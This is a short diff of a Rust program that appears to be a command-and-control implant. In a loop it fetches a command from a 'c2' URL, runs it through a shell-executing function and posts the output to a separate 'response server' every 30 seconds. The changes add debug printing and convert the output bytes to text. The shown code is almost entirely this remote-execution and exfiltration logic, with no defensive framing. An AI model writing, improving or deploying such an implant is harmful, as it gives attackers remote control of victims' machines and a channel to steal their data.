@@ -19,9 +19,9 @@ async fn main() -> Result<(), reqwest::Error> {
     let client = reqwest::Client::new();
     loop {
         let res = client.get(c2).send().await?.text().await?;// get new command from c2
-
+        dbg!(&res);
         client.post(rs)
-        .body(exec(res)) // post stdout of exec to response server
+        .body(String::from_utf8_lossy(&exec(res)).into_owned()) // post stdout of exec to response server
         .send()
         .await?;
         sleep(Duration::from_millis(30000));
@@ -41,5 +41,6 @@ fn exec(command: String) -> Vec<u8> { // function to execute a command and retur
             .output()
             .expect("failed to execute process")
     };
+    dbg!("{}", &output.stdout);
     return output.stdout;
 }
